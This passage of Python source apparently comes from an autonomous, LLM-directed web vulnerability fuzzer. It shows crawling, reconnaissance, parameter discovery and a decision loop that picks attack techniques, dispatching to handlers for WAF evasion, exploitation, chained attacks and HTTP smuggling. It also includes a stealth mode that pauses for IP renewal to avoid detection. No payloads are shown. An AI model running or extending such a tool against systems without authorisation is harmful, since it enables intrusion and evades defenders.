    
    return list(set(urls))


def discover_parameters_from_response(body: str, content_type: str = "") -> List[str]:
    """Discover potential parameters from response body."""
    params = set()
    
    # Common parameter patterns in various contexts
    patterns = [
        r'name=["\']([a-zA-Z0-9_]+)["\']',  # HTML input names
        r'id=["\']([a-zA-Z0-9_]+)["\']',    # HTML IDs
        r'"([a-zA-Z_][a-zA-Z0-9_]*)"\s*:',  # JSON keys
        r'([a-zA-Z_][a-zA-Z0-9_]*)=',       # URL params in strings
        r'data-([a-zA-Z0-9_-]+)=',          # Data attributes
        r'\$_(?:GET|POST|REQUEST)\[["\']([a-zA-Z0-9_]+)["\']\]',  # PHP params
        r'params\[:([a-zA-Z0-9_]+)\]',      # Ruby params
        r'request\.(?:GET|POST)\.get\(["\']([a-zA-Z0-9_]+)["\']\)',  # Python params
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, body)
        params.update(matches)
    
    # Filter common false positives
    false_positives = {"type", "class", "style", "value", "action", "method", "src", "href"}
    params = params - false_positives
    
    return list(params)[:50]  # Limit to 50 params


# =============================================================================
# AGENTIC FUZZER CORE
# =============================================================================

class AgenticFuzzer:
    """LLM-driven autonomous fuzzer."""
    
    def __init__(self, session: AgenticFuzzingSession):
        self.session = session
        self.conversation_history: List[Dict[str, str]] = [
            {"role": "system", "content": FUZZER_SYSTEM_PROMPT}
        ]
    
    async def run(self) -> AsyncGenerator[Dict[str, Any], None]:
        """Run the agentic fuzzing session with full robustness features."""
        operation_id = f"fuzzer_{self.session.id}"
        cancel_event = _watchdog.register_operation(operation_id)
        
        # Initialize progress tracker
        progress_tracker = get_progress_tracker(self.session.id, self.session.max_iterations)
        progress_tracker.start_phase("initialization", "Starting scan...")
        
        try:
            # Start watchdog if not running
            if not _watchdog._running:
                await _watchdog.start()
            
            # Emit initial progress event
            yield progress_tracker.get_progress_event()
            progress_tracker.complete_phase("initialization")
            
            # Initial fingerprinting with graceful degradation
            if self.session.targets and not self.session.targets[0].fingerprint:
                progress_tracker.start_phase("fingerprinting", "Fingerprinting target...")
                yield {"type": "phase", "phase": "fingerprinting", "message": "Fingerprinting target..."}
                try:
                    await asyncio.wait_for(
                        self._fingerprint_targets(),
                        timeout=_graceful_degradation.timeout_config.hard_timeout
                    )
                    progress_tracker.complete_phase("fingerprinting")
                    yield {
                        "type": "fingerprint_complete",
                        "fingerprints": [t.fingerprint.to_dict() if t.fingerprint else None for t in self.session.targets],
                    }
                except asyncio.TimeoutError:
                    _graceful_degradation.record_failure()
                    progress_tracker.complete_phase("fingerprinting", "skipped", "Timed out")
                    progress_tracker.add_warning("Fingerprinting timed out")
                    yield {"type": "warning", "message": "Fingerprinting timed out - continuing with defaults"}
            else:
                progress_tracker.complete_phase("fingerprinting", "skipped")
            
            # Apply scan profile if specified
            if self.session.scan_profile_name and SCAN_PROFILES_AVAILABLE:
                progress_tracker.start_phase("profile_load", f"Loading profile: {self.session.scan_profile_name}")
                yield {"type": "phase", "phase": "profile_load", "message": f"Loading scan profile: {self.session.scan_profile_name}..."}
                try:
                    profile = get_profile(self.session.scan_profile_name)
                    if profile:
                        self.session.scan_profile = profile.to_dict()
                        
                        # Apply profile settings to session
                        if profile.crawl_config:
                            self.session.crawl_depth = profile.crawl_config.max_depth
                            self.session.crawl_max_pages = profile.crawl_config.max_pages
                            self.session.intelligent_crawl_enabled = True
                        
                        if profile.timing_config:
                            self.session.max_iterations = min(self.session.max_iterations, 
                                                             profile.timing_config.max_scan_duration_minutes * 2)
                        
                        # Map profile techniques to FuzzingTechnique
                        if profile.enabled_techniques:
                            technique_map = {t.value: t for t in FuzzingTechnique}
                            self.session.enabled_techniques = [
                                technique_map[t] for t in profile.enabled_techniques
                                if t in technique_map
                            ]
                        
                        yield {
                            "type": "profile_loaded",
                            "profile_name": self.session.scan_profile_name,
                            "techniques_count": len(profile.enabled_techniques),
                            "risk_level": profile.risk_level.value if hasattr(profile.risk_level, 'value') else str(profile.risk_level),
                            "scan_speed": profile.scan_speed.value if hasattr(profile.scan_speed, 'value') else str(profile.scan_speed),
                        }
                        progress_tracker.complete_phase("profile_load")
                    else:
                        progress_tracker.complete_phase("profile_load", "skipped")
                        yield {"type": "warning", "message": f"Scan profile '{self.session.scan_profile_name}' not found, using defaults"}
                except Exception as profile_err:
                    logger.warning(f"Failed to load scan profile: {profile_err}")
                    progress_tracker.complete_phase("profile_load", "error", str(profile_err))
                    yield {"type": "warning", "message": f"Failed to load scan profile: {profile_err}"}
            else:
                progress_tracker.complete_phase("profile_load", "skipped")
            
            # Intelligent crawling if enabled
            if self.session.intelligent_crawl_enabled and self.session.targets and INTELLIGENT_CRAWLER_AVAILABLE:
                progress_tracker.start_phase("intelligent_crawl", "Crawling for endpoints...")
                yield {"type": "phase", "phase": "intelligent_crawl", "message": "Running intelligent crawl to discover endpoints..."}
                try:
                    base_url = self.session.targets[0].url
                    # Extract base URL (remove path)
                    from urllib.parse import urlparse
                    parsed = urlparse(base_url)
                    root_url = f"{parsed.scheme}://{parsed.netloc}"
                    
                    # Build cookies and headers from auth config
                    crawl_cookies = {}
                    crawl_headers = {}
                    if self.session.auth_config:
                        if self.session.auth_config.cookie_name and self.session.auth_config.session_token:
                            crawl_cookies[self.session.auth_config.cookie_name] = self.session.auth_config.session_token
                        if self.session.auth_config.header_name and self.session.auth_config.session_token:
                            crawl_headers[self.session.auth_config.header_name] = self.session.auth_config.session_token
                    
                    # Run the crawl
                    sitemap = await asyncio.wait_for(
                        crawl_target(
                            url=root_url,
                            max_depth=self.session.crawl_depth,
                            max_pages=self.session.crawl_max_pages,
                            include_subdomains=False,
                            extract_forms=True,
                            extract_api_endpoints=True,
                            delay_ms=100,
                            timeout_seconds=30.0,
                            cookies=crawl_cookies,
                            headers=crawl_headers,
                        ),
                        timeout=_graceful_degradation.timeout_config.hard_timeout * 2  # Allow more time for crawling
                    )
                    
                    self.session.sitemap = sitemap
                    self.session.crawl_stats = sitemap.get("statistics", {})
                    
                    # Get high-value endpoints and add them as targets
                    high_value = get_high_value_endpoints(sitemap)
                    prioritized = prioritize_endpoints_for_testing(sitemap, 
                        [t.value for t in (self.session.enabled_techniques or [])])
                    
                    # Add discovered endpoints as targets
                    added_count = 0
                    existing_urls = {t.url for t in self.session.targets}
                    
                    for endpoint_data in prioritized[:50]:  # Limit to top 50 prioritized endpoints
                        ep_url = endpoint_data.get("url")
                        if ep_url and ep_url not in existing_urls:
                            new_target = FuzzingTarget(
                                url=ep_url,
                                method=endpoint_data.get("method", "GET"),
                                parameters=[],
                                raw_request=f"{endpoint_data.get('method', 'GET')} {ep_url}",
                            )
                            
                            # Add parameters from crawl
                            for param in endpoint_data.get("parameters", []):
                                new_target.parameters.append(param.get("name", "param"))
                            
                            self.session.targets.append(new_target)
                            existing_urls.add(ep_url)
                            added_count += 1
                    
                    yield {
                        "type": "crawl_complete",
                        "urls_crawled": sitemap.get("statistics", {}).get("total_urls_crawled", 0),
                        "endpoints_found": len(sitemap.get("endpoints", [])),
                        "forms_found": sitemap.get("statistics", {}).get("total_forms", 0),
                        "parameters_found": sitemap.get("statistics", {}).get("total_parameters", 0),
                        "targets_added": added_count,
                        "auth_endpoints": len(sitemap.get("auth_endpoints", [])),
                        "api_endpoints": len(sitemap.get("api_endpoints", [])),
                        "file_upload_endpoints": len(sitemap.get("file_upload_endpoints", [])),
                        "admin_endpoints": len(sitemap.get("admin_endpoints", [])),
                    }
                    progress_tracker.add_endpoint(added_count)
                    progress_tracker.complete_phase("intelligent_crawl")
                    
                except asyncio.TimeoutError:
                    _graceful_degradation.record_failure()
                    progress_tracker.complete_phase("intelligent_crawl", "skipped", "Timed out")
                    progress_tracker.add_warning("Intelligent crawl timed out")
                    yield {"type": "warning", "message": "Intelligent crawl timed out - continuing with provided targets"}
                except Exception as crawl_err:
                    logger.warning(f"Intelligent crawl failed: {crawl_err}")
                    progress_tracker.complete_phase("intelligent_crawl", "error", str(crawl_err))
                    yield {"type": "warning", "message": f"Intelligent crawl failed: {crawl_err}"}
            else:
                progress_tracker.complete_phase("intelligent_crawl", "skipped")
            
            # Initial auto-discovery if enabled
            if self.session.auto_discovery_enabled and self.session.targets:
                progress_tracker.start_phase("reconnaissance", "Running reconnaissance...")
                yield {"type": "phase", "phase": "reconnaissance", "message": "Running enhanced reconnaissance and auto-discovery..."}
                try:
                    initial_discovery = await asyncio.wait_for(
                        self._initial_discovery(),
                        timeout=_graceful_degradation.timeout_config.hard_timeout * 2  # Allow more time for recon
                    )
                    
                    # Build comprehensive discovery message
                    discovery_message = {
                        "type": "initial_discovery",
                        "endpoints_found": initial_discovery.get("endpoints_found", []),
                        "parameters_found": initial_discovery.get("parameters_found", []),
                        "total_targets": initial_discovery.get("total_targets", len(self.session.targets)),
                    }
                    
                    # Add reconnaissance results if available
                    if initial_discovery.get("reconnaissance"):
                        recon = initial_discovery["reconnaissance"]
                        discovery_message["reconnaissance"] = recon
                        
                        # Yield separate messages for important findings
                        for auth_info in recon.get("authentication_detected", []):
                            yield {
                                "type": "auth_discovered",
                                "mechanism": auth_info.get("mechanism"),
                                "url": auth_info.get("url"),
                                "login_endpoint": auth_info.get("login_endpoint"),
                                "auth_endpoint": auth_info.get("auth_endpoint"),
                                "csrf_protected": auth_info.get("csrf_protected"),
                                "rate_limited": auth_info.get("rate_limited"),
                                "lockout_detected": auth_info.get("lockout_detected"),
                                "mfa_detected": auth_info.get("mfa_detected"),
                                "srp_details": auth_info.get("srp_details"),
                                "message": f"Detected {auth_info.get('mechanism', 'unknown')} authentication at {auth_info.get('login_endpoint') or auth_info.get('auth_endpoint') or auth_info.get('url')}",
                            }
                        
                        # Report potential vulnerabilities
                        if recon.get("potential_vulnerabilities"):
                            yield {
                                "type": "recon_vulnerabilities",
                                "vulnerabilities": recon["potential_vulnerabilities"][:10],
                                "message": f"Reconnaissance found {len(recon['potential_vulnerabilities'])} potential issues",
                            }
                        
                        # Report security features
                        for sec in recon.get("security_features", []):
                            if sec.get("brute_force_protection") or sec.get("rate_limiting"):
                                yield {
                                    "type": "security_warning",
                                    "url": sec.get("url"),
                                    "brute_force_protection": sec.get("brute_force_protection"),
                                    "rate_limiting": sec.get("rate_limiting"),
                                    "captcha": sec.get("captcha"),
                                    "message": f"Security controls detected at {sec.get('url')}: " + 
                                              ", ".join([k for k, v in sec.items() if v and k != "url"]),
                                }
                    
                    yield discovery_message
                    progress_tracker.add_endpoint(len(initial_discovery.get("endpoints_found", [])))
                    progress_tracker.complete_phase("reconnaissance")
                    
                except asyncio.TimeoutError:
                    _graceful_degradation.record_failure()
                    progress_tracker.complete_phase("reconnaissance", "skipped", "Timed out")
                    progress_tracker.add_warning("Reconnaissance timed out")
                    yield {"type": "warning", "message": "Enhanced reconnaissance timed out - continuing with basic discovery"}
                except Exception as disc_err:
                    logger.warning(f"Discovery error: {disc_err}")
                    progress_tracker.complete_phase("reconnaissance", "error", str(disc_err))
                    yield {"type": "warning", "message": f"Discovery encountered an error: {disc_err}"}
            else:
                progress_tracker.complete_phase("reconnaissance", "skipped")
            
            # Establish baseline response time for blind detection
            if self.session.blind_detection_enabled and self.session.targets:
                target = self.session.targets[0]
                try:
                    baseline_result = await asyncio.wait_for(
                        execute_fuzzing_request(target, "", position="none"),
                        timeout=_graceful_degradation.timeout_config.soft_timeout
                    )
                    self.session.baseline_response_time = baseline_result.get("response_time", 500)
                except asyncio.TimeoutError:
                    self.session.baseline_response_time = 500
            
            # Create initial checkpoint
            _watchdog.create_checkpoint(self.session.id, self.session.to_dict())
            
            # Initialize automation engine if in auto-pilot mode
            auto_pilot_mode = self.session.auto_pilot_mode if hasattr(self.session, 'auto_pilot_mode') else AutoPilotMode.DISABLED
            if auto_pilot_mode is None:
                auto_pilot_mode = AutoPilotMode.DISABLED
            
            # Technique Selection Phase
            progress_tracker.start_phase("technique_selection", "Selecting attack techniques...")
            
            # Determine which techniques to use
            techniques_to_use = []
            if self.session.enabled_techniques:
                techniques_to_use = [t.value for t in self.session.enabled_techniques]
            else:
                # Default to a comprehensive set based on target analysis
                # Use all techniques for maximum coverage
                techniques_to_use = [t.value for t in FuzzingTechnique]
                self.session.enabled_techniques = list(FuzzingTechnique)
            
            yield {
                "type": "techniques_selected",
                "techniques": techniques_to_use,
                "count": len(techniques_to_use),
                "message": f"Selected {len(techniques_to_use)} attack techniques for testing",
            }
            progress_tracker.complete_phase("technique_selection")
            
            if auto_pilot_mode != AutoPilotMode.DISABLED:
                _automation_engine.set_mode(auto_pilot_mode)
                _automation_engine.auto_escalation_enabled = self.session.auto_escalation_enabled
                
                # Generate test plan
                try:
                    test_plan = _automation_engine.generate_test_plan(
                        self.session.targets,
                        techniques_to_use if techniques_to_use else None,
                    )
                    
                    yield {
                        "type": "auto_pilot_initialized",
                        "mode": auto_pilot_mode.value,
                        "total_tasks": len(test_plan),
                        "message": f"Auto-pilot {auto_pilot_mode.value}: {len(test_plan)} tasks queued",
                    }
                except Exception as e:
                    logger.warning(f"Failed to generate test plan: {e}")
                    yield {
                        "type": "warning",
                        "message": f"Auto-pilot initialization failed, falling back to manual: {e}",
                    }
                    auto_pilot_mode = AutoPilotMode.DISABLED
            
            # Start the main fuzzing phase
            progress_tracker.start_phase("fuzzing", "Executing attack payloads...", self.session.max_iterations)
            
            while (
                self.session.status == "running" and
                self.session.iterations < self.session.max_iterations
            ):
                # Update activity timestamp at start of each iteration to prevent hung detection
                _watchdog.update_activity(operation_id)
                
                # Check for cancellation from watchdog
                if cancel_event.is_set():
                    yield {
                        "type": "warning",
                        "message": "Operation cancelled by watchdog due to timeout",
                    }
                    break
                
                # Check if we have any targets left
                if not self.session.targets:
                    yield {"type": "warning", "message": "No targets to fuzz"}
                    break
                
                # Ensure target index is valid
                if self.session.current_target_index >= len(self.session.targets):
                    self.session.current_target_index = 0
                
                self.session.iterations += 1
                
                # Check for IP renewal needed (stealth mode) - with full error protection
                try:
                    if (self.session.stealth_mode_enabled and 
                        getattr(self.session, 'stealth_ip_renewal_enabled', False) and
                        getattr(self.session, 'stealth_ip_renewal_interval', 0) > 0):
                        # Check if we've hit the IP renewal interval
                        if self.session.iterations > 1 and self.session.iterations % self.session.stealth_ip_renewal_interval == 0:
                            self.session.stealth_ip_renewal_pending = True
                            yield {
                                "type": "ip_renewal_needed",
                                "session_id": self.session.id,
                                "message": f"Stealth Mode: IP renewal recommended after {self.session.stealth_ip_renewal_interval} requests",
                                "requests_since_last_renewal": self.session.stealth_ip_renewal_interval,
                                "ip_renewal_needed": True,
                            }
                            # Wait for a longer pause to give user time to renew IP
                            pause_duration = getattr(self.session, 'stealth_pause_duration', 30.0) * 2
                            logger.info(f"[Stealth] IP renewal pause - waiting {pause_duration}s")
                            await asyncio.sleep(pause_duration)
                            self.session.stealth_ip_renewals_done = getattr(self.session, 'stealth_ip_renewals_done', 0) + 1
                            self.session.stealth_ip_renewal_pending = False
                except Exception as ip_renewal_err:
                    logger.warning(f"[Stealth] IP renewal check failed (non-fatal): {ip_renewal_err}")
                    # Continue scanning - don't let IP renewal feature crash the scan
                
                # Get current context
                try:
                    context = self._build_context()
                except Exception as ctx_err:
                    logger.warning(f"Failed to build context: {ctx_err}")
                    context = "{}"
                
                # Check for cancellation before LLM call (can be slow)
                if cancel_event.is_set():
                    yield {
                        "type": "warning",
                        "message": "Operation cancelled by watchdog - generating partial report",
                    }
                    break
                
                # Decide whether to use LLM or auto-pilot
                use_llm = True
                if auto_pilot_mode != AutoPilotMode.DISABLED:
                    try:
                        use_llm = _automation_engine.should_use_llm(
                            self.session.iterations,
                            len(self.session.findings)
                        )
                    except Exception:
                        use_llm = True
                
                decision = None
                llm_consecutive_failures = getattr(self, '_llm_consecutive_failures', 0)
                
                # If LLM has failed multiple times, skip to rule-based to keep scan moving
                if llm_consecutive_failures >= 3:
                    yield {"type": "warning", "message": f"LLM failed {llm_consecutive_failures}x - using rule-based decisions to continue"}
                    use_llm = False
                
                if use_llm or auto_pilot_mode == AutoPilotMode.DISABLED:
                    # Ask LLM for decision with graceful degradation
                    yield {"type": "thinking", "message": "Analyzing situation and deciding next action..."}
                    
                    try:
                        # Add per-decision timeout
                        decision = await asyncio.wait_for(
                            self._get_llm_decision_with_fallback(context),
                            timeout=120.0  # 2 minute max per LLM decision
                        )
                        self._llm_consecutive_failures = 0  # Reset on success
                        # Update activity after successful LLM call
                        _watchdog.update_activity(operation_id)
                    except asyncio.TimeoutError:
                        logger.warning("LLM decision timed out after 120s")
                        self._llm_consecutive_failures = getattr(self, '_llm_consecutive_failures', 0) + 1
                        _watchdog.update_activity(operation_id)  # Still update - we're still active
                        yield {"type": "warning", "message": "LLM decision timed out - using rule-based fallback"}
                        decision = await self._get_rule_based_decision(context)
                    except Exception as e:
                        self._llm_consecutive_failures = getattr(self, '_llm_consecutive_failures', 0) + 1
                        _watchdog.update_activity(operation_id)  # Still update - we're still active
                        classified_error = _error_classifier.classify(e)
                        
                        if classified_error.category == ErrorCategory.PERMANENT:
                            yield {"type": "error", "message": f"Fatal error: {e}"}
                            break
                        
                        # Use rule-based fallback or auto-pilot
                        if auto_pilot_mode != AutoPilotMode.DISABLED:
                            yield {"type": "info", "message": "LLM unavailable, using auto-pilot"}
                            try:
                                decision = _automation_engine.get_auto_decision({"context": context})
                            except Exception as auto_err:
                                logger.warning(f"Auto decision failed: {auto_err}")
                                decision = await self._get_rule_based_decision(context)
                        else:
                            yield {"type": "warning", "message": f"LLM failed, using rule-based fallback: {e}"}
                            decision = await self._get_rule_based_decision(context)
                else:
                    # Full auto-pilot mode - use automation engine
                    yield {"type": "auto_pilot", "message": "Auto-pilot making decision..."}
                    try:
                        decision = _automation_engine.get_auto_decision({"context": context})
                    except Exception as auto_err:
                        logger.warning(f"Auto-pilot decision failed: {auto_err}")
                        decision = await self._get_rule_based_decision(context)
                
                # Ensure we have a valid decision
                if decision is None:
                    decision = {
                        "decision": "move_to_next_endpoint",
                        "reasoning": "No decision could be made, moving to next target",
                    }
                
                self.session.llm_decisions.append(decision)
                
                # Get coverage stats for auto-pilot modes
                coverage_info = {}
                if auto_pilot_mode != AutoPilotMode.DISABLED:
                    try:
                        coverage_info = _automation_engine.get_coverage_summary()
                    except Exception:
                        coverage_info = {}
                
                # Update ETA with current progress
                current_eta = None
                if ETA_SERVICE_AVAILABLE:
                    try:
                        current_eta = update_eta(
                            scan_id=self.session.id,
                            current_phase=self.session.current_phase.value,
                            iteration=self.session.iterations,
                            max_iterations=self.session.max_iterations,
                            requests_made=self.session.retry_count + self.session.iterations * 10,  # Approximate
                            findings_count=len(self.session.findings),
                            endpoints_discovered=len(self.session.discovered_endpoints),
                        )
                    except Exception:
                        pass
                
                yield {
                    "type": "decision",
                    "iteration": self.session.iterations,
                    "max_iterations": self.session.max_iterations,
                    "phase": self.session.current_phase.value,
                    "technique": self.session.current_technique.value if self.session.current_technique else None,
                    "decision": decision,
                    "analysis": decision.get("analysis", ""),
                    "reasoning": decision.get("reasoning", ""),
                    "degradation_level": _graceful_degradation.current_level.value,
                    "auto_pilot_mode": auto_pilot_mode.value if auto_pilot_mode else "disabled",
                    "coverage": coverage_info if coverage_info else None,
                    "eta": current_eta.to_dict() if current_eta else None,
                }
                
                # Update progress tracker
                progress_tracker.update_iteration(self.session.iterations)
                progress_tracker.update_phase("fuzzing", step=self.session.iterations)
                if self.session.current_technique:
                    progress_tracker.add_technique(self.session.current_technique.value)
                
                # Emit detailed progress event EVERY iteration for accurate progress tracking
                # This ensures the frontend always has up-to-date progress information
                progress_tracker.findings_count = len(self.session.findings)
                yield progress_tracker.get_progress_event()
                
                # Execute decision with error handling
                action = decision.get("decision", "analyze_results")
                
                try:
                    result = await self._execute_action_with_recovery(action, decision)
                    if result:
                        yield result
                        
                        # Handle special result types
                        if result.get("type") == "finding_recorded":
                            yield {
                                "type": "finding",
                                "finding": result.get("finding"),
                                "cvss_score": result.get("cvss_score"),
                            }
                        elif result.get("type") == "blind_detection_complete":
                            if any(r.get("detected") for r in result.get("results", [])):
                                yield {
                                    "type": "blind_vuln_found",
                                    "technique": result.get("technique"),
                                    "detection_type": result.get("detection_type"),
                                }
                        elif result.get("type") == "chain_complete":
                            # First emit the completed chain status update
                            yield {
                                "type": "chain_update",
                                "chain": result.get("chain"),
                            }
                            # Then emit the finding
                            yield {
                                "type": "finding",
                                "finding": self.session.findings[-1].to_dict() if self.session.findings else None,
                                "chain_attack": True,
                            }
                        elif result.get("type") == "chain_step_complete":
                            # Emit chain progress update
                            yield {
                                "type": "chain_update",
                                "chain": result.get("chain"),
                            }
                        elif result.get("type") == "chain_step_failed":
                            # Emit failed chain update
                            yield {
                                "type": "chain_update",
                                "chain": result.get("chain"),
                            }
                        elif result.get("type") == "auto_discovery_complete":
                            if result.get("endpoints_found"):
                                yield {
                                    "type": "endpoints_discovered",
                                    "count": len(result.get("endpoints_found", [])),
                                    "endpoints": result.get("endpoints_found"),
                                }
                    
                    _graceful_degradation.record_success()
                    
                    # Track task completion for automation engine
                    if auto_pilot_mode != AutoPilotMode.DISABLED:
                        try:
                            # Track coverage for the endpoint
                            if hasattr(self.session, 'current_target_index') and self.session.targets:
                                current_target = self.session.targets[self.session.current_target_index]
                                endpoint = current_target.url if current_target else ""
                                technique_val = self.session.current_technique.value if self.session.current_technique else "unknown"
                                
                                # Mark as tested in automation engine
                                _automation_engine.coverage.mark_technique_tested(endpoint, technique_val)
                                
                                # Check for auto-escalation on findings
                                if result and result.get("type") in ["finding_recorded", "finding", "blind_vuln_found"]:
                                    _automation_engine.handle_finding_escalation(endpoint, technique_val, result)
                        except Exception as cov_err:
                            logger.debug(f"Coverage tracking error (non-fatal): {cov_err}")
                
                except Exception as action_error:
                    classified = _error_classifier.classify(action_error)
                    yield {
                        "type": "action_error",
                        "action": action,
                        "error": str(action_error),
                        "category": classified.category.value,
                        "recoverable": classified.recoverable,
                    }
                    
                    # Add to dead letter queue if recoverable
                    if classified.recoverable:
                        _dead_letter_queue.add(
                            operation=action,
                            target=self.session.targets[self.session.current_target_index].url if self.session.targets else "",
                            payload=str(decision.get("payloads", [])),
                            error=classified,
                        )
                    
                    _graceful_degradation.record_failure()
                    
                    # Skip endpoint if too many failures
                    if classified.skip_endpoint and len(self.session.targets) > 1:
                        self.session.current_target_index = (self.session.current_target_index + 1) % len(self.session.targets)
                        yield {"type": "warning", "message": "Skipping failing endpoint, moving to next target"}
                
                # Create checkpoint every 5 iterations
                if self.session.iterations % 5 == 0:
                    _watchdog.create_checkpoint(self.session.id, self.session.to_dict())
                
                # Process dead letter queue items
                ready_items = _dead_letter_queue.get_ready_items()
                for item in ready_items[:3]:  # Process max 3 per iteration
                    yield {"type": "retry", "message": f"Retrying failed operation: {item.operation}"}
                    # Mark as processed (actual retry handled in next cycle)
                    _dead_letter_queue.mark_processed(item.id, True)
                
                # Handle action completion
                if action == "complete":
                    self.session.status = "completed"
                    self.session.completed_at = datetime.utcnow().isoformat()
                    
                    # Complete ETA tracking and save history
                    if ETA_SERVICE_AVAILABLE:
                        try:
                            complete_scan_eta(
                                scan_id=self.session.id,
                                total_requests=self.session.total_requests,
                                findings_count=len(self.session.findings),
                                endpoints_count=len(self.session.targets),
                                parameters_count=sum(len(t.parameters) for t in self.session.targets),
                                techniques_used=[t.value for t in (self.session.enabled_techniques or [])],
                                target_url=self.session.targets[0].url if self.session.targets else "",
                            )
                        except Exception as eta_err:
                            logger.warning(f"Failed to complete ETA tracking: {eta_err}")
                    
                    # Mark all phases complete for 100% progress
                    progress_tracker.mark_scan_complete()
                    yield progress_tracker.get_progress_event()
                    yield await self._generate_final_report()
                    break
                
                # Small delay to prevent overwhelming
                await asyncio.sleep(0.5)
            
            # Session complete - run advanced testing phases before final report
            if self.session.status == "running":
                # Run advanced testing phases
                async for event in self._run_advanced_phases(progress_tracker):
                    yield event
                
                self.session.status = "completed"
                self.session.completed_at = datetime.utcnow().isoformat()
                
                # Mark fuzzing phase as complete and start reporting
                progress_tracker.complete_phase("fuzzing")
                progress_tracker.start_phase("reporting", "Generating final report...")
                
                # Complete ETA tracking and save history
                if ETA_SERVICE_AVAILABLE:
                    try:
                        complete_scan_eta(
                            scan_id=self.session.id,
                            total_requests=self.session.total_requests,
                            findings_count=len(self.session.findings),
                            endpoints_count=len(self.session.targets),
                            parameters_count=sum(len(t.parameters) for t in self.session.targets),
                            techniques_used=[t.value for t in (self.session.enabled_techniques or [])],
                            target_url=self.session.targets[0].url if self.session.targets else "",
                        )
                    except Exception as eta_err:
                        logger.warning(f"Failed to complete ETA tracking: {eta_err}")
                
                final_report = await self._generate_final_report()
                progress_tracker.complete_phase("reporting")
                
                # Mark all phases complete for 100% progress
                progress_tracker.mark_scan_complete()
                
                # Emit final progress event with 100% progress
                yield progress_tracker.get_progress_event()
                yield final_report
            
            # Include partial results if degraded
            if _graceful_degradation.current_level != DegradationLevel.NORMAL:
                yield {
                    "type": "degradation_notice",
                    "level": _graceful_degradation.current_level.value,
                    "partial_results": _graceful_degradation.get_partial_results(),
                }
                
        except Exception as e:
            logger.exception(f"Agentic fuzzer error: {e}")
            self.session.status = "error"
            self.session.error = str(e)
            self.session.completed_at = datetime.utcnow().isoformat()
            
            # Complete ETA tracking with failure status
            if ETA_SERVICE_AVAILABLE:
                try:
                    complete_scan_eta(
                        scan_id=self.session.id,
                        total_requests=self.session.total_requests if hasattr(self.session, 'total_requests') else 0,
                        findings_count=len(self.session.findings),
                        endpoints_count=len(self.session.targets),
                        parameters_count=sum(len(t.parameters) for t in self.session.targets),
                        techniques_used=[t.value for t in (self.session.enabled_techniques or [])],
                        target_url=self.session.targets[0].url if self.session.targets else "",
                    )
                except Exception as eta_err:
                    logger.warning(f"Failed to complete ETA tracking on error: {eta_err}")
            
            # ALWAYS generate a final report, even on error, so it can be saved
            try:
                final_report = await self._generate_final_report()
                final_report["error"] = str(e)
                yield final_report
            except Exception as report_err:
                logger.warning(f"Failed to generate final report on error: {report_err}")
                # Fallback - yield a minimal final_report with session data
                yield {
                    "type": "final_report",
                    "session_summary": self.session.to_dict(),
                    "report": {"error": str(e), "executive_summary": f"Scan ended with error: {e}"},
                    "error": str(e),
                }
            
            # Also yield the error for UI display
            partial = _graceful_degradation.get_partial_results()
            if partial:
                yield {
                    "type": "error_with_partial",
                    "error": str(e),
                    "partial_results": partial,
                    "findings_so_far": len(self.session.findings),
                }
            else:
                yield {"type": "error", "error": str(e)}
        
        finally:
            _watchdog.complete_operation(operation_id, self.session.status == "completed")
            _dead_letter_queue.remove_expired()
            # Clean up progress tracker
            cleanup_progress_tracker(self.session.id)
    
    async def _get_llm_decision_with_fallback(self, context: str) -> Dict[str, Any]:
        """Get LLM decision with fallback to simpler prompts or rule-based."""
        level = _graceful_degradation.current_level
        
        if level == DegradationLevel.NORMAL:
            return await self._get_llm_decision(context)
        
        elif level == DegradationLevel.REDUCED:
            # Use simpler prompt
            simple_context = self._build_simple_context()
            return await self._get_llm_decision(simple_context)
        
        elif level in (DegradationLevel.RULE_BASED, DegradationLevel.MINIMAL, DegradationLevel.EMERGENCY):
            return await self._get_rule_based_decision(context)
        
        return await self._get_llm_decision(context)
    
    async def _get_rule_based_decision(self, context: str) -> Dict[str, Any]:
        """Get a rule-based decision when LLM is unavailable."""
        # Simple state machine for rule-based fuzzing
        phase = self.session.current_phase
        
        if phase == FuzzingPhase.RECONNAISSANCE:
            return {
                "decision": "select_technique",
                "technique": "sqli",
                "reasoning": "[Rule-based] Starting with SQL injection testing",
                "analysis": "Using rule-based fallback due to LLM unavailability",
            }
        
        elif phase == FuzzingPhase.EXPLOITATION:
            # Get payloads for current technique
            technique = self.session.current_technique.value if self.session.current_technique else "sqli"
            payloads = _graceful_degradation.get_rule_based_payloads(technique)
            
            if payloads:
                return {
                    "decision": "generate_payloads",
                    "payloads": payloads[:5],
                    "position": "param",
                    "reasoning": "[Rule-based] Using predefined payloads",
                    "analysis": f"Testing {technique} with {len(payloads)} payloads",
                }
        
        # Default: move to next or complete
        if self.session.iterations > self.session.max_iterations * 0.8:
            return {
                "decision": "complete",
                "reasoning": "[Rule-based] Approaching max iterations, completing",
            }
        
        return {
            "decision": "move_to_next_endpoint",
            "reasoning": "[Rule-based] Moving to next target",
        }
    
    def _build_simple_context(self) -> str:
        """Build a simplified context for reduced mode."""
        target = self.session.targets[self.session.current_target_index] if self.session.targets else None
        
        return f"""
Target: {target.url if target else 'None'}
Method: {target.method if target else 'GET'}
Phase: {self.session.current_phase.value}
Iteration: {self.session.iterations}/{self.session.max_iterations}
Findings: {len(self.session.findings)}

Decide next action: select_technique, generate_payloads, analyze_results, or complete.
"""
    
    async def _execute_action_with_recovery(self, action: str, decision: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Execute an action with error recovery."""
        action_handlers = {
            "select_technique": self._handle_select_technique,
            "generate_payloads": self._handle_generate_payloads,
            "analyze_results": self._handle_analyze_results,
            "exploit_finding": self._handle_exploit_finding,
            "evade_waf": self._handle_evade_waf,
            "generate_poc": self._handle_generate_poc,
            "blind_detect": self._handle_blind_detection,
            "chain_attack": self._handle_chain_attack,
            "discover_endpoints": self._handle_discover_endpoints,
            "move_to_next_endpoint": self._handle_move_to_next,
            "map_attack_surface": self._handle_map_attack_surface,
            "import_openapi": self._handle_import_openapi,
            "oob_check": self._handle_oob_check,
            "jwt_attack": self._handle_jwt_attack,
            # NEW: Advanced technique handlers
            "http_smuggling": self._handle_http_smuggling,
            "race_condition": self._handle_race_condition,
        }
        
        handler = action_handlers.get(action)
        if not handler:
            return None
        
        try:
            result = await asyncio.wait_for(
                handler(decision),
                timeout=_graceful_degradation.timeout_config.hard_timeout
            )
            _watchdog.update_response_time(time.time())
            return result
            
        except asyncio.TimeoutError:
            _graceful_degradation.record_failure()
